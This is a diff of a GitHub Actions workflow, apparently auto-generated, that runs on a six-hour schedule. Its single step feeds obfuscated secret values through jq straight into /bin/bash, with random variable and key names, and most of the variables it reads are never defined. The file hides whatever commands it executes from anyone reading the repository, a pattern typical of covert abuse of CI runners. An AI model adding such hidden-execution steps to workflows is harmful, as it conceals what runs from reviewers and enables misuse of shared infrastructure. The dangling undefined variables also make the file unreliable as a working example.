@@ -3,20 +3,23 @@ name: taxintg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 0/6 * * *'
+    - cron: '53 3/6 * * *'
 
-jobs:  # 4802
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: taxintg
         env:
-          mxj5: ${{ secrets.mxj5 }}
+          vfesx4: ${{ secrets.vfesx4 }}
         run: |
-          echo $mxj5 | jq -r .b9023 | /bin/bash
-          echo $ik1447 | jq -r .c290 | /bin/bash
-          echo $one8 | jq -r .bzeya3 | /bin/bash
-          echo $gnj13 | jq -r .yuem5 | /bin/bash
+          echo $vfesx4 | jq -r .tkbu6 | /bin/bash
+          echo $iamg7 | jq -r .b6679 | /bin/bash
+          echo $uyhj3 | jq -r .wejx459 | /bin/bash
+          echo $fbdtf23482 | jq -r .qrj254 | /bin/bash
+          echo $u10221 | jq -r .yempa69 | /bin/bash
+          echo $buj25595 | jq -r .w0856 | /bin/bash
+          echo $nkyn82975 | jq -r .bwl8 | /bin/bash
+          echo $sbp25 | jq -r .s2 | /bin/bash
 
